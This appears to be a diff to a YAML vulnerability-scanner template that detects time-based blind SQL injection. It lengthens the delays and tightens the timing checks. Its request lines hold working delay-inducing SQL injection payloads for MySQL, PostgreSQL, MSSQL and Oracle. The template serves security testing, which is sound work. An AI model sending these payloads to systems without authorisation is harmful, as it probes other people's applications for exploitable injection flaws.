@@ -6,10 +6,10 @@ info:
   severity: critical
   description: |
     Detects time-based blind SQL injection using database-native sleep functions.
-    Uses a 5-second delay to confirm injection while avoiding false positives with
-    a baseline comparison. All payloads are read-only — no data modification occurs.
-    Supports MySQL (SLEEP), PostgreSQL (pg_sleep), MSSQL (WAITFOR DELAY), Oracle (DBMS_LOCK.SLEEP),
-    and SQLite (randomblob for CPU-based delay).
+    Uses an 8-second delay with differential comparison (injected minus baseline >= 6s)
+    to eliminate false positives from slow servers. All payloads are read-only.
+    Supports MySQL (SLEEP), PostgreSQL (pg_sleep), MSSQL (WAITFOR DELAY), and
+    Oracle (DBMS_PIPE.RECEIVE_MESSAGE).
   reference:
     - https://owasp.org/Top10/A03_2021-Injection/
   classification:
@@ -21,13 +21,13 @@ info:
   tags: owasp-top10,sqli,injection,time-based,blind,detection-only
 
 http:
-  # MySQL SLEEP variants
+  # MySQL SLEEP
   - raw:
       - |
         GET /?id=1 HTTP/1.1
         Host: {{Hostname}}
       - |
-        GET /?id=1'%20AND%20SLEEP(5)--+- HTTP/1.1
+        GET /?id=1'%20AND%20SLEEP(8)--+- HTTP/1.1
         Host: {{Hostname}}
 
     req-condition: true
@@ -35,15 +35,15 @@ http:
       - type: dsl
         name: mysql-sleep-confirmed
         dsl:
-          - 'duration_2 >= 5 && duration_1 < 3'
+          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'
 
-  # MySQL alternative: IF-based
+  # MySQL IF-based
   - raw:
       - |
         GET /?id=1 HTTP/1.1
         Host: {{Hostname}}
       - |
-        GET /?id=1'%20AND%20(SELECT%20IF(1=1,SLEEP(5),0))--+- HTTP/1.1
+        GET /?id=1'%20AND%20(SELECT%20IF(1=1,SLEEP(8),0))--+- HTTP/1.1
         Host: {{Hostname}}
 
     req-condition: true
@@ -51,7 +51,7 @@ http:
       - type: dsl
         name: mysql-if-sleep-confirmed
         dsl:
-          - 'duration_2 >= 5 && duration_1 < 3'
+          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'
 
   # PostgreSQL pg_sleep
   - raw:
@@ -59,7 +59,7 @@ http:
         GET /?id=1 HTTP/1.1
         Host: {{Hostname}}
       - |
-        GET /?id=1'%3B%20SELECT%20pg_sleep(5)--+- HTTP/1.1
+        GET /?id=1'%3B%20SELECT%20pg_sleep(8)--+- HTTP/1.1
         Host: {{Hostname}}
 
     req-condition: true
@@ -67,7 +67,7 @@ http:
       - type: dsl
         name: postgresql-sleep-confirmed
         dsl:
-          - 'duration_2 >= 5 && duration_1 < 3'
+          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'
 
   # PostgreSQL CASE-based
   - raw:
@@ -75,7 +75,7 @@ http:
         GET /?id=1 HTTP/1.1
         Host: {{Hostname}}
       - |
-        GET /?id=1'%20AND%20(SELECT%20CASE%20WHEN%20(1=1)%20THEN%20pg_sleep(5)%20ELSE%20pg_sleep(0)%20END)--+- HTTP/1.1
+        GET /?id=1'%20AND%20(SELECT%20CASE%20WHEN%20(1=1)%20THEN%20pg_sleep(8)%20ELSE%20pg_sleep(0)%20END)--+- HTTP/1.1
         Host: {{Hostname}}
 
     req-condition: true
@@ -83,7 +83,7 @@ http:
       - type: dsl
         name: postgresql-case-sleep-confirmed
         dsl:
-          - 'duration_2 >= 5 && duration_1 < 3'
+          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'
 
   # MSSQL WAITFOR DELAY
   - raw:
@@ -91,7 +91,7 @@ http:
         GET /?id=1 HTTP/1.1
         Host: {{Hostname}}
       - |
-        GET /?id=1'%3B%20WAITFOR%20DELAY%20'0:0:5'--+- HTTP/1.1
+        GET /?id=1'%3B%20WAITFOR%20DELAY%20'0:0:8'--+- HTTP/1.1
         Host: {{Hostname}}
 
     req-condition: true
@@ -99,15 +99,15 @@ http:
       - type: dsl
         name: mssql-waitfor-confirmed
         dsl:
-          - 'duration_2 >= 5 && duration_1 < 3'
+          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'
 
-  # Oracle DBMS_PIPE.RECEIVE_MESSAGE (available to PUBLIC)
+  # Oracle DBMS_PIPE.RECEIVE_MESSAGE
   - raw:
       - |
         GET /?id=1 HTTP/1.1
         Host: {{Hostname}}
       - |
-        GET /?id=1'%20AND%201=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--+- HTTP/1.1
+        GET /?id=1'%20AND%201=DBMS_PIPE.RECEIVE_MESSAGE('a',8)--+- HTTP/1.1
         Host: {{Hostname}}
 
     req-condition: true
@@ -115,4 +115,4 @@ http:
       - type: dsl
         name: oracle-pipe-delay-confirmed
         dsl:
-          - 'duration_2 >= 5 && duration_1 < 3'
+          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'
